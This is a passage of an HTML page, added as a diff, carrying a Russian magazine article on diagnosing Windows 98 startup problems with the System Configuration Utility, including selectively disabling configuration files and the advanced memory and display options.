+            <P>exec.bat, config.sys, system.ini и win.ini автоматически 
+            скопируются в корневой каталог с расширением .pss. Если же вы 
+            внесете какие-либо изменения, которые вызовут дополнительные 
+            осложнения, то все равно сможете потом восстановить сохраненные 
+            файлы, щелкнув на кнопке «Восстановить копию». Проверьте также 
+            атрибуты каждого файла, для чего в Проводнике выделите правой 
+            кнопкой мыши имя файла, отметьте опцию «Свойства», а если включена 
+            опция «Только чтение», то снимите это ограничение.</P>
+            <P>Далее в «Программе настройки системы» на закладке «Общие» 
+            замените обычный способ запуска системы выборочным. Если для 
+            конфигурационного файла опция включена, то он будет выполняться во 
+            время запуска Windows 98, а если выключена — будет обойден. Если 
+            какой-либо файл не подсвечен, а опция для него выключена, то этого 
+            файла на вашей машине нет. Например, winstart.bat — сетевой файл для 
+            работы в реальном режиме — отображается на большинстве машин именно 
+            таким образом. Предупреждение: если вы не находите файла 
+            autoexec.bat или config.sys, не волнуйтесь. Для работы Windows 98 
+            они не нужны, однако ОС должна включать файлы system.ini и 
+            win.ini.</P>
+            <P>Начните тестирование, исключив запуск файла config.sys (для чего 
+            отключите опцию в соответствующем квадрате). Затем нажмите ОК в 
+            нижней части диалогового окна и перезагрузите систему, выбрав «Да», 
+            когда вопрос будет предложен. Проблема исчезла — значит, был виноват 
+            файл config.sys, осталась — исключайте по одному каждый из трех 
+            оставшихся файлов.</P>
+            <P>Если вы обнаружили, что донимающая вас неприятность кроется в 
+            каком-либо из конфигурационных файлов, то сделайте следующий шаг, 
+            чтобы определить, какая же из командных строк файла в этом виновата. 
+            В «Программе настройки системы» выделите соответствующую данному 
+            файлу закладку и внимательно просмотрите, какие входящие в него 
+            командные строки включены.</P>
+            <H3>Терпение и еще раз терпение</H3>
+      Сначала отключите все 
+            командные строки. Перезагружайте систему, добавляя каждый раз по 
+            одной строке. Бывает, что в файле очень много строк, тогда, чтобы 
+            быстрее выявить проблему, включайте сразу по четыре строки или 
+            группу строк. Если же при этом вам случится изуродовать Windows, то 
+            при следующей перезагрузке система войдет в режим защиты от сбоя 
+            (Safe Mode), что позволит устранить нанесенный ущерб, вернув прежние 
+            установки вместо только что измененных.
+            <P>В случае, когда настройка конфигурационных файлов не избавляет от 
+            головной боли, перезапустите систему без автоматически выполняемых 
+            при загрузке программ и посмотрите, не устранилась ли ваша проблема. 
+            Для этого выключите опцию «Загружать элементы меню автозагрузки», 
+            откройте закладку «Автозагрузка» и удостоверьтесь в том, что все 
+            выполняемые при автозагрузке программы действительно отключены. 
+            Программы, которые загружаются из файла win.ini с помощью строки 
+            run=, нужно отключать вручную.</P>
+            <P>Но если вам ничего не помогло, то щелкните в нижней части 
+            закладки «Общие» на кнопке «Дополнительно». Здесь вы найдете еще ряд 
+            настроек, которые могут пригодиться для поиска и устранения 
+            неприятностей. Вот их краткое описание.</P>
+            <P><B>Использовать режим VGA 640x480x16.</B> Включив эту опцию, вы 
+            изменяете драйвер экрана системы на простейший драйвер VGA. 
+            Всяческого рода проблемы с графическими драйверами встречаются очень 
+            часто, да и привести могут к чему угодно: от скверной картинки до 
+            спонтанной перезагрузки системы. Поэтому если VGA вам поможет, 
+            скопируйте обновленный драйвер с Web-узла поставщика вашей 
+            графической платы.</P>
+            <P><B>Ограничить память.</B> Поскольку причиной ошибок могут быть 
+            подпорченные микросхемы памяти, можно уменьшить объем памяти, 
+            например до 16 Мбайт, и запретить доступ Windows 98 к большей 
+            оперативной памяти, чем ограничено принятым значением. Если такая 
+            уловка позволит справиться с проблемой, то, видимо, какую-то из 
+            микросхем памяти нужно заменить. А когда в ПК установлено несколько 
+            модулей памяти типа SIMM или DIMM, то сначала удалите их, а потом 
+            добавляйте по одному и перезапускайте ПК. Делайте это до тех пор, 
+            пока не выделите модуль, содержащий негодную микросхему. Затем 
+            замените его новым и после устранения проблемы отключите данную 
+            опцию — иначе Windows 98 не получит доступа ко всей оперативной 
+            памяти вашей системы.</P>
+            <P><B>Запретить EMM использовать адреса AOOO-FFFF.</B> Включив эту 
+            опцию, можно устранить конфликты с памятью между адаптером и ПЗУ 
+            системы, а также вызванные программами, требующими дополнительной 
+            памяти (в основном это игры). Если вы не любитель сложных игр, то 
+            беспокоиться вам, вероятно, не о чем, ибо схему спецификации 
+            дополнительной памяти используют только древние DOS-приложения. Если 
+            такая настройка разрешит проблему, то либо сохраните ее (что отнимет 
+            память у приложений, не работающих в среде Windows), либо 
+            попытайтесь определить область (или области), ответственные за 
+            возникновение конфликта. Для этого выключите указанную опцию и 
+            добавьте в раздел [386 Enhanced] файла system.ini строку EMMExclude= 
+            C400-C7FF E000-EFFF. Обычно конфликты возникают где-то в пределах 
+            этих двух областей, однако если вы сумеете идентифицировать все 
+            используемые в вашей системе адреса ПЗУ и теневой памяти, то 
+            узнаете, какую именно часть области следует исключить.</P>
+            <P><B>Запретить быстрое завершение работы.</B> Некоторые приложения 
+            «не любят», когда Windows 98 быстро завершает работу, и потому 
+            «подвешивают» вашу систему. После включения данной опции будет 
+            применяться практикующаяся в Windows 95 более медленная процедура. 
+            </P>
+            <p><font size="2">Автор: Керк Стирс<br>
+            Источник: <a href="http://www.osp.ru">www.osp.ru</a></font></p></td>
+  </tr>
+  <center>
+  <tr>
+    <td>
+      <hr size="1" color="#000000">
+    </td>
+  </tr>
+  <tr>
+    <td><font face="Arial" color="#000000" size="1">Copyright © 1999-2000гг.&nbsp;<a href="http://www.izone.com.ua/" target="_blank">&quot;Internet
+      Zone&quot;</a> &amp; Nik Romanov. <a href="mailto:nikspase@mail.ru">nikspase@mail.ru</a>,
+      <a href="mailto:nikspase@hotmail.ru">nikspase@hotmail.ru,</a>&nbsp; </font><a href="http://www.izone.com.ua/" target="_blank"><font size="1" face="Arial">http://www.izone.com.ua/</font></a></td>
+  </tr>
+  <tr>
+    <td><font face="Arial" size="1">Копирование и
+      использование данных материалов
+      разрешается только в случае указания на
+      журнал &quot;<a href="http://www.izone.com.ua/" target="_blank">Internet
+      Zone</a>&quot; как на источник получения
+      информации, при этом во всех ссылках
+      обязательно явное указание адреса вэб-сайта
+      <a href="http://www.izone.com.ua/" target="_blank">http://www.izone.com.ua/</a>.</font></td>
+  </tr>
+  </table>
+</center>
+
+</body>
+
+</html>
+
